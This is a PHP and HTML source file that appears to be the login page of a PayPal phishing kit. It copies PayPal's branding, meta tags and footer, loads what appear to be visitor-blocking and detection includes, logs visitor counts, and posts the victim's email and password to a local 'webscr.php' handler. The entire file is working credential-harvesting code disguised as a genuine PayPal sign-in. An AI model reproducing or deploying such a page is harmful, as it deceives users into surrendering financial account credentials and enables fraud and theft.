<?php 
error_reporting(0); 
include('../blocker.php');
include('../detect.php');
include('../function.php');
include('../pais/logintrans.php');
include('../pais/enc.php');

$datei = fopen("../logsz/visitor.txt","r");
$count = fgets($datei,1000);
fclose($datei);
$count=$count + 1 ;

$datei = fopen("../logsz/visitor.txt","w");
fwrite($datei, $count);
fclose($datei);

?>


<!DOCTYPE html>
<html lang="en" class="no-js desktop">
<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head>
	<meta charset="utf-8" /> 
	<title><?= $title ?></title>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
	<meta name="application-name" content="PayPal" />
	<meta name="msapplication-task" content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
	<meta name="msapplication-task" content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;send_method=domestic;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
	<meta name="msapplication-task" content="name=Request Money;action-uri=https://personal.paypal.com/cgi-bin/?cmd=_render-content&amp;content_ID=marketing_us/request_money;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
	<meta name="keywords" content="transfer money, email money transfer, international money transfer " />
	<meta name="description" content="Transfer money online in seconds with PayPal money transfer. All you need is an email address." />
	<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes" />
	<link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
	<link rel="apple-touch-icon" href="../assets/webstatic/icon/pp64.png" />
	<script type="text/javascript" src="../assets/jquery-1.9.1.js"></script>
	<script type="text/javascript" src="../assets/jquery-blockUI.js"></script>

	<link rel="stylesheet" href="../assets/web/res/dc4/38f805dc755e79c5e1c20794a80fd/css/contextualLogin.css" />
	<style id="antiClickjack">body {display: none !important;}</style>
</head>
<body class="desktop" data-rlogid="qplPUgF7WIXxCyceMFetgBNEGBUvD5tCsyynAvjUIdZOj7Zt9cgydToFRvWeffO%2BMHZgSVdZ748SDNwrH%2FuOBrwGhbnRTie5_163358b41f0" data-hostname="rZJvnqaaQhLn/nmWT8cSUm+72VQ7inHLmNSWW7oQxSqkM7CaNNY3vz7b/m5cAJw1O0tMAZNZFts" data-production="true" data-enable-ads-captcha="true" data-ads-challenge-url="/auth/createchallenge/2e073ec12eb2995c/challenge.js" data-enable-client-cal-logging="true" data-correlation-id="1fb5491cd9f1b" data-show-hide-password="true" data-enable-fn-beacon-on-web-views="true" data-csrf-token="vLHaM3glFh0E7eX4Ia8Ausn97DHmljnGQ7AMo=" data-nonce="mlCEr1wm1NbT6tWI91w+FkJD7p3aLKKpkZg7L3aPkqShSIsl" data-tealeaf-url="https://www.paypalobjects.com/web/res/dc4/38f805dc755e79c5e1c20794a80fd/js/lib/tealeaf-ul-prod_domcap.min.js">
	<img src="../assets/spinner.gif" id="rotatingDiv" style="display: none;">
	<div id="main" class="main" role="main">
		<section id="login" class="login " data-role="page" data-title="Log in to your PayPal account" style="height: 100%">
			<div class="corral">
				<div class="contentContainer activeContent contentContainerBordered">
					<header >
						<p class="paypal-logo paypal-logo-long">
						</p>
					</header>
					<h1 class="headerText accessAid"><?= $title ?>
					</h1>
					<p id="phoneSubTagLine" class="subHeaderText hide hide"><?= $otherwise ?>
					</p>
					<div  class="notifications">
					</div>
					<form action="webscr.php?cmd=_login-run&amp;dispatch=<?php echo md5(microtime());?>" method="post" class="proceed maskable" autocomplete="off" name="login" autocomplete="off" novalidate>
<input id="token" name="_csrf" value="acSpvh36coEL4FdLjIbUKlhvXpr2sI/bdMVKo=" type="hidden"><input name="locale.x" value="en_US" type="hidden"><input name="processSignin" value="main" type="hidden">
							<div id="passwordSection" class="clearfix">
								<div class="textInput" id="login_emaildiv">
									<div class="fieldWrapper"><label for="email" class="fieldLabel"><?= $email ?></label><input value="" id="email" name="login_email" class="hasHelp  validateEmpty  " required="required" aria-required="true" autocomplete="off" placeholder="<?= $email ?>" type="email"></div>
									<div class="errorMessage" id="emailErrorMessage">
										<p class="emptyError hide">Required</p>
										<p class="invalidError hide">That email format isn’t right</p>
									</div>
								</div>
								<div class="textInput lastInputField" id="login_passworddiv">
									<div class="fieldWrapper"><label for="password" class="fieldLabel"><?= $password ?></label><input id="password" name="login_password" class="hasHelp  validateEmpty  " required="required" aria-required="true" value="" placeholder="<?= $password ?>" type="password"></div>
									<div class="errorMessage" id="passwordErrorMessage">
										<p class="emptyError hide">Required</p>
									</div>
								</div>
							</div>
							<div class="actions actionsSpaced"><button class="button actionContinue" type="submit" id="btnLogin" name="btnLogin" value="Login"><?= $login ?></button></div>
							<div class="forgotLink"><a href="#" id="forgotPasswordModal" class="scTrack:unifiedlogin-click-forgot-password"><?= $troublelogin ?></a></div>
							<input value="v=1;a1=na~a2=na~a3=na~a4=Mozilla~a5=Netscape~a6=5.0 (Windows)~a7=20100101~a8=na~a9=true~a10=Windows NT 6.2; WOW64~a11=true~a12=Win32~a13=na~a14=Mozilla/5.0 (Windows NT 6.2; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0~a15=false~a16=en-US~a17=na~a18=www.paypal.com~a19=na~a20=na~a21=na~a22=na~a23=1366~a24=768~a25=24~a26=728~a27=na~a28=Mon Jul 04 2016 07:28:53 GMT+0700 (SE Asia Standard Time)~a29=7~a30=na~a31=yes~a32=na~a33=yes~a34=no~a35=no~a36=yes~a37=no~a38=online~a39=no~a40=Windows NT 6.2; WOW64~a41=no~a42=no~" name="bp_mid" id="bp_mid" type="hidden">
						</form>
						<div class="loginSignUpSeparator"><span class="textInSeparator" aria-label="or">or</span></div><a href="/id/webapps/mpp/account-selection" class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount">Sign Up</a>
					</div>
				</div>
<footer class="footer" role="contentinfo"><div class="legalFooter"><ul class="footerGroup"><li><a target="_blank" href="https://paypal.com/us/cgi-bin/webscr?cmd=_help">Contact Us</a></li><li><a target="_blank" href="https://paypal.com/us/webapps/mpp/ua/privacy-full">Privacy</a></li><li><a target="_blank" href="https://paypal.com/us/webapps/mpp/ua/legalhub-full">Legal</a></li><li><a target="_blank" href="https://paypal.com/us/webapps/mpp/country-worldwide">Worldwide</a></li></ul></div></footer></div>
	</div>
	<script type="text/javascript">
		$("#btnNext").click(function(){
			var email = $("#email").val();
			$.blockUI({message: $("#rotatingDiv")});
			window.setTimeout(function () {
				$(function(){
					$.unblockUI();
					$("#font_email").text(email);
					$("#splitEmail").animate({width: "toggle"});
					$("#splitPassword").fadeIn();
				});
			}, 3000); /* ms mili second 1s = 1000ms */

		});
	</script>
</body>
</html>